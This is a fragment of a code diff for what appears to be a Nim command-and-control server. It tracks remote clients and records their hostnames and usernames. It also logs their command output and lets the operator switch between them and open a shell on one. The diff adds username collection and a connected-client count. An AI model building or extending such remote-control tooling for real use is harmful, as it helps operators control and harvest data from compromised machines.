@@ -32,9 +32,9 @@ proc processMessages(server: C2Server, client: Client) {.async.} =
     if line == "pong":
       echo "pong from " & $client
     if line.startsWith("INFO:"):
-      let hostname = line.split(":")[1]
       server.clients[client.id].loaded = true
-      server.clients[client.id].hostname = hostname
+      server.clients[client.id].hostname = args[1]
+      server.clients[client.id].username = args[2]
     if line.startsWith("OUTPUT:"):
       logClientOutput client, args[1], args[2]
       if not clResp.isNil():
@@ -60,7 +60,8 @@ proc acceptSocketClients(port = 12345) {.async.} =
       id: server.clients.len,
       connected: true,
       loaded: false,
-      hostname: "placeholder"
+      hostname: "placeholder",
+      username: "placeholder"
     )
 
     cConnected(client)
@@ -83,9 +84,10 @@ proc procStdin() {.async.} =
       if cmd == "clients":
         for client in server.clients:
           if client.connected:
-            stdout.styledWriteLine fgGreen, "[+] ", @client, fgWhite
+            stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
           else:
-            stdout.styledWriteLine fgRed, "[-] ", @client, fgWhite
+            stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
+          infoLog $len(server.clients) & " clients currently connected"
       if cmd.startsWith("switch"):
         for client in server.clients:
           if client.id == parseInt(args[1]):
@@ -100,7 +102,7 @@ proc procStdin() {.async.} =
       if cmd.startsWith("info"):
         for client in server.clients:
           if client.id == handlingClient:
-            echo $client
+            echo @client
       if cmd.startsWith("shell"):
         for client in server.clients:
           if client.id == handlingClient:
